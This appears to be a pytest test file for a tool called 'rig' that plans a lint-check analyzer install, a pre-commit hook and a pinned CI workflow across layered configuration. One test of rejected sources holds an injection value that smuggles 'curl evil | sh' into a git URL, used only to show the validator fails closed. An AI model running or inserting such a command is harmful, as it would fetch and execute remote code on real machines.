"""Plan wiring of the default-on ``lint_checks`` activation (cccc analyzer + pre-commit hook + CI workflow).

The check is independent of ``linters.*`` (Oxc/Biome/``linters.enabled``), is gated only by
``lint_checks.enabled`` (repo layer beats global), rides the existing dispatcher for the hook and the
rig-owned workflow renderer for CI, and must show up in the `rig apply info` preview.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest
from lint_checks_helpers import RIG_SOURCE

from riglib import cccc_install, config, lint_checks_ci
from riglib import lint_checks_artifacts as arts
from riglib.catalog import Catalog
from riglib.cli import main
from riglib.config import LoadedConfig
from riglib.plan import build

pytestmark = pytest.mark.usefixtures("pinned_rig")

KINDS = {"install_cccc", "install_lint_check_hook", "install_lint_check_workflow"}


def _plan(
    fake_agent_tools: Path, tmp_path: Path, data: dict | None = None, repo: Path | None = None,
    source: str | None = RIG_SOURCE, global_lint: dict | None = None,
):
    """Build the plan; ``source`` is the configured ``lint_checks.ci.rig_source`` (None leaves it unset).

    ``data['lint_checks']`` is the REPO layer's block; ``global_lint`` is the GLOBAL layer's (it also
    lands in the merged ``data``, repo keys winning, and alone in ``global_data`` — like ``config.load``).
    """
    data = dict(data or {})
    merged = {k: (dict(v) if isinstance(v, dict) else v) for k, v in (global_lint or {}).items()}
    for key, value in data.get("lint_checks", {}).items():
        merged[key] = {**merged.get(key, {}), **value} if isinstance(value, dict) else value
    if source is not None:
        merged["ci"] = {"rig_source": source}
    if merged:
        data["lint_checks"] = merged
    cfg = LoadedConfig(data=data, repo_root=repo or tmp_path, global_data={"lint_checks": global_lint} if global_lint else {})
    return build(cfg, Catalog.scan(str(fake_agent_tools)), project_type="cli")


def _lint_actions(plan) -> dict[str, object]:
    return {a.kind: a for a in plan.actions if a.category in ("lint_checks", "lint_checks_machine")}


def _dispatcher(tmp_path: Path, **extra) -> dict:
    return {"git_hooks": {"dispatcher": {"enabled": True, "dir": str(tmp_path / "disp"), **extra}}}


def test_default_on_without_any_config(fake_agent_tools, tmp_path):
    plan = _plan(fake_agent_tools, tmp_path)
    acts = _lint_actions(plan)
    assert set(acts) == {"install_cccc", "install_lint_check_workflow"}  # dispatcher off by default in a bare dict
    assert acts["install_cccc"].target == cccc_install.managed_binary_path()
    assert acts["install_cccc"].options["version"] == cccc_install.PINNED_VERSION
    assert any("pre-commit hook NOT installed" in n and "dispatcher" in n for n in plan.notes)  # loud, not silent


def test_hook_rides_the_dispatcher_with_pinned_absolute_rig(fake_agent_tools, tmp_path):
    acts = _lint_actions(_plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path)))
    assert set(acts) == KINDS
    hook = acts["install_lint_check_hook"]
    assert hook.target == tmp_path / "disp" / "pre-commit" / "30-lint-check"
    assert hook.options["rig_bin"] == "/opt/rig/bin/rig"
    wf = acts["install_lint_check_workflow"]
    assert wf.target == tmp_path and wf.options["rel_path"] == ".github/workflows/rig-lint-check.yml"


@pytest.mark.parametrize(
    "files,data",
    [
        ({"biome.json": "{}", "package.json": "{}"}, {}),  # Biome-only repo
        ({}, {}),  # no linter at all
        ({"package.json": "{}"}, {"linters": {"enabled": False}}),  # linters switched off wholesale
        ({"biome.json": "{}"}, {"linters": {"enabled": False}, "stack": "ts"}),
    ],
)
def test_independent_of_linters(fake_agent_tools, tmp_path, files, data):
    repo = tmp_path / "repo"
    repo.mkdir()
    for name, text in files.items():
        (repo / name).write_text(text, encoding="utf-8")
    acts = _lint_actions(_plan(fake_agent_tools, tmp_path, {**data, **_dispatcher(tmp_path)}, repo=repo))
    assert set(acts) == KINDS


def test_absent_when_disabled_globally(fake_agent_tools, tmp_path):
    plan = _plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path), global_lint={"enabled": False})
    assert _lint_actions(plan) == {}  # no machine actions, and no workflow either: the merged config is off
    assert not any("lint_checks" in n for n in plan.notes)


def test_repo_opt_out_removes_only_the_repo_workflow(fake_agent_tools, tmp_path):
    """The analyzer + hook are machine-wide: one repo's `enabled: false` must not remove (or re-plan) them."""
    plan = _plan(fake_agent_tools, tmp_path, {"lint_checks": {"enabled": False}, **_dispatcher(tmp_path)})
    assert set(_lint_actions(plan)) == KINDS - {"install_lint_check_workflow"}
    assert not any("lint_checks" in n for n in plan.notes)


def test_repo_reenable_against_a_global_opt_out_gets_its_analyzer_and_workflow_but_no_hook(fake_agent_tools, tmp_path):
    """The analyzer is per machine and harmless: the repo's own `rig lint check` needs it, and the 127 message names `rig apply commit`."""
    plan = _plan(fake_agent_tools, tmp_path, {"lint_checks": {"enabled": True}, **_dispatcher(tmp_path)}, global_lint={"enabled": False})
    assert set(_lint_actions(plan)) == {"install_cccc", "install_lint_check_workflow"}  # the global switch keeps the hook out


def test_repo_reenable_with_complexity_off_against_a_global_opt_out_needs_no_analyzer(fake_agent_tools, tmp_path):
    data = {"lint_checks": {"enabled": True, "complexity": {"enabled": False}}, **_dispatcher(tmp_path)}
    plan = _plan(fake_agent_tools, tmp_path, data, global_lint={"enabled": False})
    assert set(_lint_actions(plan)) == {"install_lint_check_workflow"}


def test_repo_opt_out_against_a_global_enabled_machine_keeps_analyzer_and_hook(fake_agent_tools, tmp_path):
    data = {"lint_checks": {"enabled": False}, **_dispatcher(tmp_path)}
    plan = _plan(fake_agent_tools, tmp_path, data, global_lint={"enabled": True, "complexity": {"enabled": True}})
    assert set(_lint_actions(plan)) == {"install_cccc", "install_lint_check_hook"}


def test_globally_disabled_sub_checks_keep_activation(fake_agent_tools, tmp_path):
    lint = {"complexity": {"enabled": False}, "file_lines": {"enabled": False}}
    kinds = set(_lint_actions(_plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path), global_lint=lint)))
    assert kinds == KINDS - {"install_cccc"}  # no complexity anywhere => no analyzer to download


def test_repo_disabled_sub_checks_still_plan_the_machine_analyzer(fake_agent_tools, tmp_path):
    data = {"lint_checks": {"complexity": {"enabled": False}, "file_lines": {"enabled": False}}, **_dispatcher(tmp_path)}
    assert set(_lint_actions(_plan(fake_agent_tools, tmp_path, data))) == KINDS


def test_analyzer_follows_the_layers_that_run_complexity(fake_agent_tools, tmp_path):
    both_off = _lint_actions(_plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path), global_lint={"complexity": {"enabled": False}}))
    assert "install_cccc" not in both_off
    assert both_off["install_lint_check_hook"].options["needs_analyzer"] is False
    repo_on = _lint_actions(_plan(
        fake_agent_tools, tmp_path, {"lint_checks": {"complexity": {"enabled": True}}, **_dispatcher(tmp_path)},
        global_lint={"complexity": {"enabled": False}},
    ))  # a repo that enables complexity itself needs the analyzer, and the machine hook must wait for it
    assert "install_cccc" in repo_on and repo_on["install_lint_check_hook"].options["needs_analyzer"] is True
    repo_off = _lint_actions(_plan(fake_agent_tools, tmp_path, {"lint_checks": {"complexity": {"enabled": False}}, **_dispatcher(tmp_path)}))
    assert "install_cccc" in repo_off and repo_off["install_lint_check_hook"].options["needs_analyzer"] is True
    on = _lint_actions(_plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path)))
    assert on["install_lint_check_hook"].options["needs_analyzer"] is True
    assert list(on).index("install_cccc") < list(on).index("install_lint_check_hook")  # the analyzer runs first


@pytest.mark.parametrize(
    "global_cx,repo_cx,with_analyzer",
    [
        (True, True, True),
        (True, False, False),  # the repo itself turned it off: CI (defaults + repo layer) runs no complexity
        (True, None, True),
        (False, True, True),
        (False, False, True),  # repo-level off is indistinguishable from the global one after the merge: keep the step (safe)
        (False, None, True),  # CI never reads the global config: complexity runs there by default, the analyzer is required
        (None, True, True),
        (None, False, False),
        (None, None, True),
    ],
)
def test_workflow_analyzer_step_reflects_what_ci_sees(fake_agent_tools, tmp_path, global_cx, repo_cx, with_analyzer):
    """CI reads built-in defaults + the repo layer only, so a global-only opt-out must not drop the analyzer step."""
    def block(value):
        return {} if value is None else {"complexity": {"enabled": value}}

    plan = _plan(fake_agent_tools, tmp_path, {"lint_checks": block(repo_cx), **_dispatcher(tmp_path)}, global_lint=block(global_cx))
    assert _lint_actions(plan)["install_lint_check_workflow"].options["with_analyzer"] is with_analyzer


def test_global_complexity_off_hook_survives_a_platform_without_an_analyzer(fake_agent_tools, tmp_path, monkeypatch):
    monkeypatch.setattr(cccc_install, "platform_key", lambda: ("plan9", "mips"))
    plan = _plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path), global_lint={"complexity": {"enabled": False}})
    assert "install_lint_check_hook" in _lint_actions(plan)


def test_repo_complexity_off_does_not_unblock_the_hook_on_a_platform_without_an_analyzer(fake_agent_tools, tmp_path, monkeypatch):
    monkeypatch.setattr(cccc_install, "platform_key", lambda: ("plan9", "mips"))
    data = {"lint_checks": {"complexity": {"enabled": False}}, **_dispatcher(tmp_path)}
    plan = _plan(fake_agent_tools, tmp_path, data)
    assert "install_lint_check_hook" not in _lint_actions(plan)
    assert any("pre-commit hook NOT installed" in n and "plan9/mips" in n for n in plan.notes)


def test_no_rig_source_means_no_workflow_and_a_loud_note(fake_agent_tools, tmp_path):
    plan = _plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path), source=None)
    acts = _lint_actions(plan)
    assert set(acts) == {"install_cccc", "install_lint_check_hook"}
    note = next(n for n in plan.notes if "CI workflow not written" in n)
    assert "lint_checks.ci.rig_source" in note and "git+https://" in note


@pytest.mark.parametrize(
    "bad",
    [
        "hyper-rig==0.69.0",  # not an immutable git commit (and does not resolve on PyPI)
        "git+https://git.example.test/org/rig-cli@main",
        "git+https://git.example.test/org/rig-cli@v1.0.0",
        "git+https://git.example.test/org/rig-cli",
        "git+https://git.example.test/org/rig-cli@" + "A" * 40,
        "git+https://git.example.test/org/rig-cli@" + "a" * 39,
        "git+http://git.example.test/org/rig-cli@" + "a" * 40,
        'git+https://git.example.test/org/rig-cli@' + "a" * 40 + '" && curl evil | sh #',
        "git+https://git.example.test/../rig-cli@" + "a" * 40,
        "git+https://user:pw@git.example.test/org/rig-cli@" + "a" * 40,
        "",
        5,
        ["git+https://git.example.test/org/rig-cli@" + "a" * 40],
    ],
)
def test_mutable_or_unsafe_rig_source_fails_the_plan_closed(fake_agent_tools, tmp_path, bad):
    with pytest.raises(config.ConfigError, match=r"lint_checks\.ci\.rig_source"):
        _plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path), source=bad)


def test_invalid_block_fails_the_plan_closed(fake_agent_tools, tmp_path):
    with pytest.raises(config.ConfigError):
        _plan(fake_agent_tools, tmp_path, {"lint_checks": {"complexity": {"max_cognitive": 0}}})


_SRC = f"ci: {{rig_source: '{RIG_SOURCE}'}}"


@pytest.mark.parametrize(
    "global_yaml,repo_yaml,hook_on,analyzer_on,workflow_on",
    [
        ("lint_checks: {enabled: false}\n", f"lint_checks: {{enabled: true, {_SRC}}}\n", False, True, True),  # repo re-enables only itself
        ("lint_checks: {enabled: true}\n", f"lint_checks: {{enabled: false, {_SRC}}}\n", True, True, False),  # repo opts out of its own gate only
        ("lint_checks: {enabled: false}\n", f"lint_checks: {{{_SRC}}}\n", False, False, False),  # global opt-out inherited by the repo
        ("", f"lint_checks: {{{_SRC}}}\n", True, True, True),  # default
    ],
)
def test_hook_follows_the_global_layer_the_analyzer_any_complexity_layer_the_workflow_the_merged_one(
    fake_agent_tools, tmp_path, monkeypatch, global_yaml, repo_yaml, hook_on, analyzer_on, workflow_on,
):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "xdg"))
    config.global_config_path().parent.mkdir(parents=True, exist_ok=True)
    config.global_config_path().write_text("version: 1\n" + global_yaml, encoding="utf-8")
    repo = tmp_path / "repo"
    repo.mkdir()
    dispatcher = f"git_hooks: {{dispatcher: {{enabled: true, dir: {tmp_path / 'disp'}}}}}\n"
    (repo / "rig.yaml").write_text("version: 1\n" + dispatcher + repo_yaml, encoding="utf-8")
    kinds = set(_lint_actions(build(config.load(repo), Catalog.scan(str(fake_agent_tools)), project_type="cli")))
    assert ("install_lint_check_hook" in kinds) is hook_on
    assert ("install_cccc" in kinds) is analyzer_on
    assert ("install_lint_check_workflow" in kinds) is workflow_on


def test_tracked_files_workflow_literal_matches_the_rendered_path():
    from riglib.tracked_files import _ACTION_FILES

    assert _ACTION_FILES["install_lint_check_workflow"] == (arts.WORKFLOW_REL,)


def test_dispatcher_fragment_opt_out_and_ci_opt_out_are_loud(fake_agent_tools, tmp_path):
    plan = _plan(
        fake_agent_tools, tmp_path,
        {**_dispatcher(tmp_path, fragments={"lint-check": {"enabled": False}}), "ci": {"enabled": False}},
    )
    assert set(_lint_actions(plan)) == {"install_cccc"}  # the manually invoked CLI still consumes it
    notes = "\n".join(plan.notes)
    assert "fragments.lint-check.enabled: false" in notes and "CI workflow not written" in notes
    custom = _plan(fake_agent_tools, tmp_path, {"ci": {"target": "export-only"}})
    assert "install_lint_check_workflow" not in _lint_actions(custom)


def test_apply_info_preview_lists_the_actions(tmp_path, capsys, fake_agent_tools, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "no-global"))
    monkeypatch.setenv("RIG_AGENT_TOOLS_SOURCE", str(fake_agent_tools))
    cfg = tmp_path / "rig.yaml"
    cfg.write_text(
        f"version: 1\nagent_tools_source: {fake_agent_tools}\n"
        "skills: {enabled: false}\nagent_hooks: {enabled: false}\nci: {enabled: true, items: {}}\nmcp: {enabled: false}\n"
        f"git_hooks: {{dispatcher: {{enabled: true, dir: {tmp_path / 'disp'}, set_global_hooks_path: false, "
        "install_local_retrofit_script: false}}\n"
        "harness: {enabled: false}\npermissions: {enabled: false}\nagents_md: {enabled: false}\n"
        "gitignore: {enabled: false}\ntmux: {enabled: false}\ntg_ctl: {enabled: false}\nmodels: {enabled: false}\n"
        f"lint_checks: {{ci: {{rig_source: '{RIG_SOURCE}'}}}}\n",
        encoding="utf-8",
    )
    rc = main(["apply", "info", "--plan", "-C", str(tmp_path), "--config", str(cfg)])
    out = capsys.readouterr().out
    assert rc == 0
    assert "lint_checks_machine/cccc" in out
    assert "lint_checks_machine/pre-commit-hook" in out and "30-lint-check" in out
    assert "lint_checks/ci-workflow" in out
    assert not (tmp_path / "disp").exists() and not (tmp_path / ".github").exists()  # preview mutates nothing


def test_workflow_is_pinned_and_safe():
    text = arts.render_workflow(RIG_SOURCE, True)
    pin = cccc_install.pin_for(("linux", "x86_64"))
    assert "pull_request_target" not in text
    assert "uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683" in text
    assert "persist-credentials: false" in text and "contents: read" in text
    assert pin.tarball_sha256 in text and pin.binary_sha256 in text and pin.url in text
    assert f'pip" install --quiet "{RIG_SOURCE}"' in text and "rig lint check --json" in text
    assert "hyper-rig" not in text  # the nonexistent PyPI pin is gone
    assert "Managed by Rig" in text.splitlines()[0]


@pytest.mark.parametrize("xdg", [None, "", "data-home"])
def test_workflow_installs_the_analyzer_exactly_where_rig_looks_for_it(tmp_path, monkeypatch, xdg):
    """The step's `dest=` shell line and cccc_install.managed_binary_path() agree for an unset, empty or set XDG_DATA_HOME."""
    dest_line = next(
        line.strip() for line in arts.render_workflow(RIG_SOURCE, True).splitlines() if line.strip().startswith("dest=")
    )
    env = {"HOME": str(tmp_path / "home"), "PATH": "/usr/bin:/bin"}
    monkeypatch.setenv("HOME", env["HOME"])
    monkeypatch.delenv("XDG_DATA_HOME", raising=False)
    if xdg is not None:
        env["XDG_DATA_HOME"] = xdg and str(tmp_path / xdg)
        monkeypatch.setenv("XDG_DATA_HOME", env["XDG_DATA_HOME"])
    out = subprocess.run(["sh", "-c", dest_line + '; printf %s "$dest"'], env=env, capture_output=True, text=True, check=True)
    assert Path(out.stdout) == cccc_install.managed_binary_path().parent


def test_workflow_bytes_depend_only_on_the_configured_source():
    from riglib import _version

    before = arts.render_workflow(RIG_SOURCE, True)
    assert _version.resolve_version() not in before  # a rig upgrade never churns every repo's workflow
    assert arts.render_workflow(RIG_SOURCE, True) == before
    other = "git+https://git.example.test/org/rig-cli@" + "b" * 40
    assert arts.render_workflow(other, True) != before


def test_workflow_skips_the_analyzer_download_without_complexity():
    text = arts.render_workflow(RIG_SOURCE, False)
    pin = cccc_install.pin_for(("linux", "x86_64"))
    assert pin.url not in text and "cccc" not in text
    assert f'"{RIG_SOURCE}"' in text


def test_render_workflow_refuses_a_mutable_source():
    with pytest.raises(ValueError, match="non-immutable"):
        arts.render_workflow("git+https://git.example.test/org/rig-cli@main", True)
    assert lint_checks_ci.is_immutable_source(RIG_SOURCE)


def _run_hook(tmp_path: Path, rig_bin: str) -> subprocess.CompletedProcess[str]:
    frag = tmp_path / "frag"
    frag.write_text(arts.render_hook_fragment(rig_bin), encoding="utf-8")
    return subprocess.run(["sh", str(frag)], capture_output=True, text=True, check=False)


@pytest.mark.parametrize("rc", [0, 1, 2, 3, 127])
def test_hook_propagates_every_exit_code_and_runs_staged_json(tmp_path, rc):
    rig = tmp_path / "my rig"  # a space in the pinned path must survive quoting
    rig.write_text(f'#!/bin/sh\necho "$@" > "{tmp_path}/argv"\nexit {rc}\n', encoding="utf-8")
    rig.chmod(0o755)
    res = _run_hook(tmp_path, str(rig))
    assert res.returncode == rc
    assert (tmp_path / "argv").read_text().strip() == "lint check --staged --json"
    if rc:
        assert "commit blocked" in res.stderr


def test_hook_fails_closed_when_rig_is_missing(tmp_path):
    res = _run_hook(tmp_path, str(tmp_path / "gone" / "rig"))
    assert res.returncode == 1 and "fail closed" in res.stderr


def test_machine_artifacts_are_global_and_the_workflow_is_repo_layer(fake_agent_tools, tmp_path):
    from riglib.areas import AREAS
    from riglib.layers import GLOBAL, REPO, layer_for_category

    acts = _lint_actions(_plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path)))
    assert layer_for_category(acts["install_cccc"].category) == GLOBAL
    assert layer_for_category(acts["install_lint_check_hook"].category) == GLOBAL
    assert layer_for_category(acts["install_lint_check_workflow"].category) == REPO
    by_cat = {c: a for a in AREAS for c in a.categories}
    assert by_cat["lint_checks_machine"].layer == GLOBAL and by_cat["lint_checks"].layer == REPO


def test_unsupported_platform_keeps_the_analyzer_action_but_never_the_hook(fake_agent_tools, tmp_path, monkeypatch):
    monkeypatch.setattr(cccc_install, "platform_key", lambda: ("plan9", "mips"))
    plan = _plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path))
    # the loud BLOCKED install_cccc stays; a hook that would block every commit for an analyzer that can never exist does not
    assert set(_lint_actions(plan)) == {"install_cccc", "install_lint_check_workflow"}
    assert any("pre-commit hook NOT installed" in n and "plan9/mips" in n for n in plan.notes)


def test_hook_pins_the_running_rig_and_never_a_bare_name(fake_agent_tools, tmp_path, monkeypatch):
    from riglib.actions import runner

    def missing() -> str:
        raise runner.RigPinError("cannot pin rig: not started from a launcher and none on PATH")

    monkeypatch.setattr(runner, "pinned_rig_path", missing)
    plan = _plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path))
    assert "install_lint_check_hook" not in _lint_actions(plan)
    assert any("pre-commit hook NOT installed" in n and "cannot pin rig" in n for n in plan.notes)
    monkeypatch.setattr(runner, "pinned_rig_path", lambda: "/usr/local/bin/rig")
    assert _lint_actions(_plan(fake_agent_tools, tmp_path, _dispatcher(tmp_path)))["install_lint_check_hook"].options["rig_bin"] == "/usr/local/bin/rig"
